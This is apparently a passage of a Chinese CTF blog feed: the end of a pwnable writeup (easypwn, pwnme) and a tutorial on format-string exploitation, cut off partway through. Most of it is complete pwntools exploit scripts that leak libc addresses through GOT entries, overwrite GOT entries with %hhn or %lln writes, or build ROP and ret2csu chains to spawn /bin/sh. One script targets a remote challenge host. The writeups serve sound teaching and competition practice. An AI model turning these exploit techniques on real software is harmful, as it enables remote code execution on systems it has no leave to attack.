class="line">payload='A'*72</span><br><span class="line">payload+=p64(canary)</span><br><span class="line">payload+='B'*8</span><br><span class="line">payload+=p64(0x4007EA)</span><br><span class="line">payload+=p64(0)</span><br><span class="line">payload+=p64(1)</span><br><span class="line">payload+=p64(read_got)</span><br><span class="line">payload+=p64(10)</span><br><span class="line">payload+=p64(0x0000000000601060)</span><br><span class="line">payload+=p64(0)</span><br><span class="line">payload+=p64(0x00000000004007D0)</span><br><span class="line">payload+='A'*56</span><br><span class="line">payload+=p64(pop_rdi_ret)</span><br><span class="line">payload+=p64(0x0000000000601060)</span><br><span class="line">payload+=p64(system_addr)</span><br><span class="line">payload+=p64(pop_rdi_ret)</span><br><span class="line"></span><br><span class="line">a.sendline(payload)</span><br><span class="line">sleep(0.1)</span><br><span class="line">a.sendline(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">a.interactive()</span><br></pre></td></tr></table></figure></p><h4 id="pwnme"><a href="#pwnme" class="headerlink" title="pwnme"></a>pwnme</h4><p>程序中存在格式化串漏洞，栈溢出，整型溢出。做法有多种。</p><p>这里存在格式化串漏洞：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">sub_400AD1</span><span class="params">(<span class="keyword">char</span> format, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6, <span class="keyword">char</span> formata, __int64 a8, __int64 a9)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(&amp;formata);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;a9 + <span class="number">4</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这里有整数溢出：<br><img src="/2019/03/08/i春秋pwnable-writeup/2.png" alt=""><br>由于char是8位，则输入的字节个数超过256即可绕过</p><p>这里有栈溢出：<br><img src="/2019/03/08/i春秋pwnable-writeup/1.png" alt=""><br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *__<span class="function">fastcall <span class="title">sub_400A90</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x14</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">memcpy</span>(&amp;s, a1, a2);#溢出了</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这里单独使用栈溢出来做。<br>完整exp如下：<br><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"><span class="comment">#a=process("./pwnme")</span></span><br><span class="line">a=remote(<span class="string">"106.75.2.53"</span>,<span class="string">"10006"</span>)</span><br><span class="line">offset=40</span><br><span class="line">elf=ELF(<span class="string">"./pwnme"</span>)</span><br><span class="line">puts_plt=elf.plt[<span class="string">"puts"</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">"puts"</span>]</span><br><span class="line">pop_rdi_ret=0x400ed3</span><br><span class="line">length=260</span><br><span class="line">def init():</span><br><span class="line">    a.recvuntil(<span class="string">"Input your username(max lenth:40): \n"</span>)</span><br><span class="line">    a.sendline(<span class="string">"a"</span>)</span><br><span class="line">    a.recvuntil(<span class="string">"Input your password(max lenth:40): \n"</span>)</span><br><span class="line">    a.sendline(<span class="string">"a"</span>)</span><br><span class="line">    a.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">    a.sendline(<span class="string">"2"</span>)</span><br><span class="line">    a.recvuntil(<span class="string">"please input new username(max lenth:20): \n"</span>)</span><br><span class="line">    a.sendline(<span class="string">"a"</span>)</span><br><span class="line">    a.recvuntil(<span class="string">"please input new password(max lenth:20): \n"</span>)</span><br><span class="line"></span><br><span class="line">init()</span><br><span class="line">payload='A'*40</span><br><span class="line">payload+=p64(pop_rdi_ret)</span><br><span class="line">payload+=p64(puts_got)</span><br><span class="line">payload+=p64(puts_plt)</span><br><span class="line">payload+=p64(0x400770)<span class="comment">#start_addr</span></span><br><span class="line">payload+='A'*(length-len(payload))</span><br><span class="line">a.sendline(payload)</span><br><span class="line">puts_addr=u64(a.recvuntil(<span class="string">"\n"</span>,drop=True).ljust(8,<span class="string">"\x00"</span>))</span><br><span class="line">print <span class="string">"puts_addr = "</span>+ str(hex(puts_addr))</span><br><span class="line">init()</span><br><span class="line">libc=LibcSearcher(<span class="string">"puts"</span>,puts_addr)</span><br><span class="line">system_addr=puts_addr-libc.dump(<span class="string">"puts"</span>)+libc.dump(<span class="string">"system"</span>)</span><br><span class="line">bin_sh=puts_addr-libc.dump(<span class="string">"puts"</span>)+libc.dump(<span class="string">"str_bin_sh"</span>)</span><br><span class="line">print hex(system_addr)</span><br><span class="line">read_got=elf.got[<span class="string">"read"</span>]</span><br><span class="line">payload='A'*40</span><br><span class="line">payload+=p64(0x400eca)</span><br><span class="line">payload+=p64(0)</span><br><span class="line">payload+=p64(1)</span><br><span class="line">payload+=p64(read_got)</span><br><span class="line">payload+=p64(10)</span><br><span class="line">payload+=p64(elf.bss())</span><br><span class="line">payload+=p64(0)</span><br><span class="line">payload+=p64(0x400eb0)</span><br><span class="line">payload+='A'*56</span><br><span class="line">payload+=p64(pop_rdi_ret)</span><br><span class="line">payload+=p64(elf.bss())</span><br><span class="line">payload+=p64(system_addr)</span><br><span class="line">payload+=p64(0x400770)</span><br><span class="line">payload+='A'*(length-len(payload))</span><br><span class="line">a.sendline(payload)</span><br><span class="line">sleep(0.1)</span><br><span class="line">a.sendline(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">a.interactive()</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;easypwn&quot;&gt;&lt;a href=&quot;#easypwn&quot; class=&quot;headerlink&quot; title=&quot;easypwn&quot;&gt;&lt;/a&gt;easypwn&lt;/h4&gt;&lt;figure class=&quot;highlight cpp&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;g
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>格式化串漏洞利用总结</title>
    <link href="http://yoursite.com/2019/02/22/%E6%A0%BC%E5%BC%8F%E5%8C%96%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/"/>
    <id>http://yoursite.com/2019/02/22/格式化串漏洞利用总结/</id>
    <published>2019-02-22T11:43:00.000Z</published>
    <updated>2019-02-26T12:26:52.217Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h3><p>这篇笔记总结下格式化字符串漏洞的利用。看之前需要对基本格式化字符串漏洞原理有所了解，在先前的笔记中已有。<br>格式化字符串漏洞的利用，往往就两点：泄露内存，修改内存。泄露内存可以泄露栈上数据，如 saved ebp/rbp , 返回地址，还有函数的got表项内容。修改内存可以修改got表项内容，返回地址，变量的值等等。还可以利用他来写ROP等。</p><h3 id="预备知识："><a href="#预备知识：" class="headerlink" title="预备知识："></a>预备知识：</h3><ol><li>%x:   他可以将对应参数的值以16进制打印出来，<strong>%x只能打印4个字节，%lx或者%llx可以打8个字节</strong>。如%x表示要泄漏对应偏移4字节长度的16进制数据，%llx表示要泄漏对应偏移8字节长度的16进制数据。</li><li>%s：可以打印<strong>对应参数所指向的字符串</strong>。</li><li>%n:  可以修改对应参数（这个参数是指针）所指向的变量的值为%n之前打印的字符的个数，如果是32位程序，则这个指针变量为4字节，64位程序这个指针变量为8字节，这是因为不同位数，地址的长度不同。<strong>还要注意%n是修改对应参数指向的地址起，4字节长度的空间。，%hn，是修改2字节的地址空间，%hhn是1字节的地址空间，%lln是修改8字节的地址空间。</strong><br><strong>像修改地址这样的大数据，如果一次输出太多的字节可能会引起程序崩溃，则可以利用%hn，%hhn来一部分一部分的写入，下面修改内存部分会讲到。</strong></li></ol><h3 id="泄露内存："><a href="#泄露内存：" class="headerlink" title="泄露内存："></a>泄露内存：</h3><h4 id="泄露got表项内容："><a href="#泄露got表项内容：" class="headerlink" title="泄露got表项内容："></a>泄露got表项内容：</h4><p>   泄露内存可以泄露程序中使用过的函数的got表项的内容，得到该函数的地址。但是在64位程序中，往往会被\x00给截断。。因为64位程序中，很多地址的高位是00，但是在32位程序中不会，这就需要将地址写在格式化串的末尾。<br>   如果已知目标程序使用的libc库，就可以计算出system函数的地址，<br>   如果题目没有给出目标程序使用的libc库，则可以多泄露几个函数的地址，通过 <a href="http://libcdb.com/" target="_blank" rel="noopener">http://libcdb.com/</a> 来获知目标程序使用的libc库，然后再计算出system函数的地址。也可以使用这个python的库<a href="https://github.com/lieanu/LibcSearcher" target="_blank" rel="noopener">https://github.com/lieanu/LibcSearcher</a> 来获知目标程序使用的动态库，原理都是一样的：ASLR不会随机化地址的后12bit。<br>具体计算方法是:<br><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">libc_base</span> = 泄露函数的地址 - 其在libc库中的偏移(libc.symbols[<span class="string">"函数名"</span>])</span><br><span class="line"><span class="attr">system_address</span> = libc_base + system在库中的偏移(libc.symbols[<span class="string">"system"</span>])</span><br></pre></td></tr></table></figure></p><p> 出现格式化串漏洞的时候，程序往往是这样的：</p><pre><code>char a[50];read(0,a,50);printf(a);</code></pre><p>则你输入的字符串是保存在栈中的（后面会讨论格式化串不在栈中的情况，如在bss段或者堆中），然后你调用printf函数，此时printf函数的堆栈是在原先函数堆栈的低地址处，所以printf可以找到字符串的空间。<br>如图：<br><img src="/2019/02/22/格式化串漏洞利用总结/1.png" alt=""><br>例如可以得到这样的结果：<br><img src="/2019/02/22/格式化串漏洞利用总结/2.png" alt=""><br>可以看到AAAA在格式化串偏移7位置处。<br>如果将第七个%x，换成%s，那就将打印0x41414141这个地址指向的字符串了。很可能这不是一个有效的字符串地址，换成%s，会出现段错误。<br>如果将AAAA换成有效的字符串地址，则将字符串打印出来。</p><p>写个例子，分别讨论下32位和64位。</p><h5 id="32位程序："><a href="#32位程序：" class="headerlink" title="32位程序："></a>32位程序：</h5><p> 源代码如下：<br> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fsb</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>,<span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>,<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">char</span> a[<span class="number">100</span>];</span><br><span class="line">  read(<span class="number">0</span>,a,<span class="number">100</span>);</span><br><span class="line">  <span class="built_in">printf</span>(a);</span><br><span class="line">  <span class="built_in">memset</span>(a,<span class="number">0</span>,<span class="keyword">sizeof</span>(a));</span><br><span class="line">  read(<span class="number">0</span>,a,<span class="number">0x500</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  fsb();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>编译时关闭了canary和pie保护：<br> <code>gcc -m32 demo.c -fno-stack-protector -no-pie -g -o demo</code><br> 这里的setbuf函数是关闭输出缓冲区，防止远程打的时候，没有输出。<br> 题目的思路如下：<br> 使用格式化串漏洞随便泄露一个函数的got表项内容，结合libc库，计算出libc的基地址，接着计算出system函数的地址。<br> 此时格式化串的构造方式为：<br> <code>payload=p32(函数got表项的地址)+ %offset$s</code><br> offset怎么计算，可以看看格式化串漏洞的基本原理。<br> 这样就可以将got表项的内容打印出来，计算出system函数的地址后，简单的rop，即可得到shell，完整exp如下：<br> <figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line">from pwn import *</span><br><span class="line">a=process(<span class="string">"./demo"</span>)</span><br><span class="line">elf=ELF(<span class="string">"./demo"</span>)</span><br><span class="line">libc=ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line">offset=7</span><br><span class="line"></span><br><span class="line">read_got=elf.got[<span class="string">"read"</span>]</span><br><span class="line">payload=p32(read_got)+<span class="string">"%7$s"</span> <span class="comment">#格式化串</span></span><br><span class="line">a.send(payload)</span><br><span class="line">read_addr=u32(a.recv(8)[4:8]) <span class="comment">#接受read函数的地址</span></span><br><span class="line"></span><br><span class="line">system_addr=read_addr-libc.symbols[<span class="string">"read"</span>]+libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">pop3ret = 0x8048619 </span><br><span class="line">payload='A'*112 <span class="comment">#padding</span></span><br><span class="line">payload+=p32(read_addr) <span class="comment">#read函数将/bin/sh读入bss段</span></span><br><span class="line">payload+=p32(pop3ret)</span><br><span class="line">payload+=p32(0)</span><br><span class="line">payload+=p32(elf.bss())</span><br><span class="line">payload+=p32(10)</span><br><span class="line">payload+=p32(system_addr)</span><br><span class="line">payload+=p32(pop3ret)</span><br><span class="line">payload+=p32(elf.bss())</span><br><span class="line"></span><br><span class="line">a.sendline(payload)</span><br><span class="line">sleep(0.1)</span><br><span class="line">a.sendline(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">a.interactive()</span><br></pre></td></tr></table></figure></p><p><img src="/2019/02/22/格式化串漏洞利用总结/3.png" alt=""></p><h5 id="64位程序："><a href="#64位程序：" class="headerlink" title="64位程序："></a>64位程序：</h5><p>和32位程序的代码是一样的。编译时去掉了-m32选项。</p><p>64位参数的传递和32位有所不同，由于64位cpu寄存器很多，所以前6个参数通过寄存器传递，从函数名开始的第一个参数到第六个参数依次放在rdi,rsi,rdx,rcx,r8,r9，多余6个的参数，从右往左依次入栈。<br>由于64位程序的地址，很多高位是0，这样就会导致，格式化串被\x00截断,例如：<br><img src="/2019/02/22/格式化串漏洞利用总结/4.png" alt=""><br>拿read函数的got举例：<br><code>p64(read_got)=&quot;\x30\x10\x60\x00\x00\x00\x00\x00&quot;</code><br>由于字符串是以\x00结尾的，所以会被截断，但是将其放在字符串的末尾就可以解决了：<br><code>payload=&#39;A&#39;*(???) + &#39;%&#39; + str(offset+????) + &quot;$s&quot; + p64(read_got)</code><br>要注意将地址写在8字节对齐处。<br>payload前面的AAA..是为了将p64(read_got)写在8字节对齐处，至于要写多少个A，就按具体情况计算了。<br>完整的脚本如下：<br><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line">from pwn import *</span><br><span class="line"><span class="comment">#context.log_level="debug"</span></span><br><span class="line">a=process(<span class="string">"./demo64"</span>)</span><br><span class="line">elf=ELF(<span class="string">"./demo64"</span>)</span><br><span class="line">libc=ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line">offset=6</span><br><span class="line"></span><br><span class="line">read_got=elf.got[<span class="string">"read"</span>]</span><br><span class="line">payload=<span class="string">"AAAA%7$s"</span>+p64(read_got)<span class="comment">#本例中是4个A</span></span><br><span class="line">a.sendline(payload)</span><br><span class="line">read_addr=u64(a.recvuntil(<span class="string">"\x30"</span>,drop=True)[4:].ljust(8,'\x00'))</span><br><span class="line">print <span class="string">"read_addr = "</span>+str(hex(read_addr))</span><br><span class="line"></span><br><span class="line">system_addr=read_addr-libc.symbols[<span class="string">"read"</span>]+libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">print <span class="string">"system_addr = "</span>+str(hex(system_addr))</span><br><span class="line">pop_rdi_ret=0x400753 <span class="comment">#ROPgadget</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#ret2csu </span></span><br><span class="line">payload='A'*120 <span class="comment">#padding</span></span><br><span class="line">payload+=p64(0x40074A)<span class="comment">#csu_init </span></span><br><span class="line">payload+=p64(0)<span class="comment">#rbx=0</span></span><br><span class="line">payload+=p64(1)<span class="comment">#rbp=1</span></span><br><span class="line">payload+=p64(read_got)<span class="comment">#r12 </span></span><br><span class="line">payload+=p64(0)<span class="comment">#arg3 -&gt; fd</span></span><br><span class="line">payload+=p64(elf.bss())<span class="comment">#arg2 -&gt; buf</span></span><br><span class="line">payload+=p64(7)<span class="comment">#arg1 -&gt; length</span></span><br><span class="line">payload+=p64(0x400730)<span class="comment">#csu_init</span></span><br><span class="line">payload+='A'*56 <span class="comment">#padding</span></span><br><span class="line">payload+=p64(pop_rdi_ret)<span class="comment">#return address</span></span><br><span class="line">payload+=p64(elf.bss())</span><br><span class="line">payload+=p64(system_addr)</span><br><span class="line">a.sendline(payload)</span><br><span class="line">sleep(0.1)</span><br><span class="line">a.send(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">a.interactive()</span><br></pre></td></tr></table></figure></p><p><img src="/2019/02/22/格式化串漏洞利用总结/5.png" alt=""></p><h3 id="修改内存："><a href="#修改内存：" class="headerlink" title="修改内存："></a>修改内存：</h3><p>   修改内存往往是修改函数的GOT表项，例如修改为system函数的地址，则调用被修改got表的函数就会调用system函数。结合下面的小例子来看一下：</p><pre><code>#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int main(){  setbuf(stdout,0);  while(1)  {    char b[100];    gets(b);    printf(b);  }  return 0;}</code></pre><p>   编译时关闭了canary保护和PIE保护。<br>   这个例子的利用思路就是先使用printf函数泄露某个函数的地址，然后结合libc库，计算出system函数的地址。第二次利用printf函数修改printf函数的got表项内容为system函数的地址，再输入字符串/bin/sh\x00，则再次调用printf函数时，其实会调用system(“/bin/sh”)，这样就可以拿到shell了。下面分32位程序和64位程序：</p><h5 id="32位程序：-1"><a href="#32位程序：-1" class="headerlink" title="32位程序："></a>32位程序：</h5><p>   32位程序不会有被地址截断的情况，则格式化串比较好写。<br>   可以用%hhn一个字节一个字节写，这样打印的字符就会很少，不至于程序崩溃，当然也可以用%hn两个字节两个字节写入。<br>   一个字节写入的模板如下：<br><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload=p<span class="number">32</span><span class="comment">(target)</span>+p<span class="number">32</span><span class="comment">(target+1)</span>+p<span class="number">32</span><span class="comment">(target+2)</span>+p<span class="number">32</span><span class="comment">(target+3)</span></span><br><span class="line">payload+=<span class="string">'%'</span>+str<span class="comment">(length1)</span>+<span class="string">'c'</span>+<span class="string">"%"</span>+str<span class="comment">(offset)</span>+<span class="string">"$hhn"</span></span><br><span class="line">payload+=<span class="string">'%'</span>+str<span class="comment">(length2)</span>+<span class="string">'c'</span>+<span class="string">"%"</span>+str<span class="comment">(offset+1)</span>+<span class="string">"$hhn"</span></span><br><span class="line">payload+=<span class="string">'%'</span>+str<span class="comment">(length3)</span>+<span class="string">'c'</span>+<span class="string">"%"</span>+str<span class="comment">(offset+2)</span>+<span class="string">"$hhn"</span></span><br><span class="line">payload+=<span class="string">'%'</span>+str<span class="comment">(length4)</span>+<span class="string">'c'</span>+<span class="string">"%"</span>+str<span class="comment">(offset+3)</span>+<span class="string">"$hhn"</span></span><br></pre></td></tr></table></figure></p><p>pwntools这个库有了现成的函数fmtstr_payload，可以生成修改内存的格式化串,但是这个只适用于32位的，原因是这个函数生成的payload和上面写的模板是一样的，64位的程序，地址会有00，这个payload会被截断。<br>   完整的利用脚本如下：</p><pre><code>#!/usr/bin/env pythonfrom pwn import *context.log_level=&quot;debug&quot;a=process(&quot;./fsb&quot;)elf=ELF(&quot;./fsb&quot;)libc=ELF(&quot;./libc.so.6&quot;)printf_got=elf.got[&quot;printf&quot;]def leak(addr):    payload=p32(addr)    payload+=&quot;%7$s&quot;    a.sendline(payload)    data=a.recv(8)[4:8]    return datadef get(target,printed):    if printed&gt;target:        return (256-printed+target)    elif printed==target:        return 0    else:         return target-printeddef modify(target,offset,old):    t1=target&amp;0xff    t2=target&gt;&gt;8&amp;0xff    t3=target&gt;&gt;16&amp;0xff    t4=target&gt;&gt;24&amp;0xff    payload=p32(old)+p32(old+1)+p32(old+2)+p32(old+3)    len1=get(t1,len(payload))    len2=get(t2,(len1)+16)    len3=get(t3,(len2+len1)+16)    len4=get(t4,(len3+len2+len1)+16)    payload+=&apos;%&apos;+str(len1)+&apos;c&apos;+&apos;%&apos;+str(offset)+&apos;$hhn&apos;    payload+=&apos;%&apos;+str(len2)+&apos;c&apos;+&apos;%&apos;+str(offset+1)+&apos;$hhn&apos;    payload+=&apos;%&apos;+str(len3)+&apos;c&apos;+&apos;%&apos;+str(offset+2)+&apos;$hhn&apos;    payload+=&apos;%&apos;+str(len4)+&apos;c&apos;+&apos;%&apos;+str(offset+3)+&apos;$hhn&apos;    return payloadprintf_addr=u32(leak(printf_got))system_addr=printf_addr-libc.symbols[&quot;printf&quot;]+libc.symbols[&quot;system&quot;]payload=modify(system_addr,7,printf_got)a.sendline(payload) sleep(0.1)a.sendline(&quot;/bin/sh\x00&quot;)a.interactive()</code></pre><p>解释下脚本：</p><pre><code>payload=p32(old)+p32(old+1)+p32(old+2)+p32(old+3)</code></pre><p>这里是先将要修改的got表项的地址写入栈中，然后利用找到的偏移来一个字节一个字节的修改</p><pre><code>def get(target,printed):        if printed&gt;target:            return (0x100-printed+target)        elif printed==target:            return 0        else:             return target-printed</code></pre><p>get函数是用来计算要打印多少字节的。如果前面覆盖字节所需打印的字符的个数超过了后面要打印字符的个数，则可以通过溢出来调整，例如你想要写入\x00，则你可以打印0x100个字符，因为只能写入一个字节长度，所以高位字节会被截断，只留下\x00。</p><h5 id="64位程序：-1"><a href="#64位程序：-1" class="headerlink" title="64位程序："></a>64位程序：</h5><p>64位程序用这道题做示范：ASIS CTF 2017 Mary Morton</p><p>网上的writeup都是使用现成的工具formatStringExploiter来攻击的。<br>还有的writeup是通过泄露canary，利用栈溢出写rop利用的。这次通过手动利用格式化串漏洞来攻击。<br>64位程序，修改内存，就不能像上面32位那样分开一点一点写了，只能利用%lln一次写完。当然，如果目标内存，只需要修改2个字节或者4字节，就可以使用%hn，%n。<br>格式化串的模板如下：<br><code>payload=&#39;a&#39;*(???)+&#39;%&#39;+str(length)+&#39;c&#39;+&#39;%&#39;+str(offset+????)+&quot;$lln&quot;+p64(目标地址)</code><br>payload前面的 ‘a’ 是考虑到字节对齐的问题，要将目标地址写在8字节对齐处。offset要加多少，也是根据具体情况。<br>题目的main函数如下：<br><img src="/2019/02/22/格式化串漏洞利用总结/6.png" alt=""><br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">fsb</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-90h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+88h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);<span class="meta">#canary</span></span><br><span class="line">  <span class="built_in">memset</span>(&amp;buf, <span class="number">0</span>, <span class="number">0x80</span>uLL);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x7F</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;buf, &amp;buf);#格式化串漏洞</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">stackoverflow</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-90h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+88h] [rbp-8h]</span></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);<span class="meta">#canary</span></span><br><span class="line">  <span class="built_in">memset</span>(&amp;buf, <span class="number">0</span>, <span class="number">0x80</span>uLL);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>uLL);#栈溢出</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"-&gt; %s\n"</span>, &amp;buf);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>程序中给了后门函数,但是没有shell。<br><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> sub_4008DA()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="function"><span class="keyword">return</span> <span class="title">system</span><span class="params">(<span class="string">"/bin/cat ./flag"</span>)</span></span>;</span><br><span 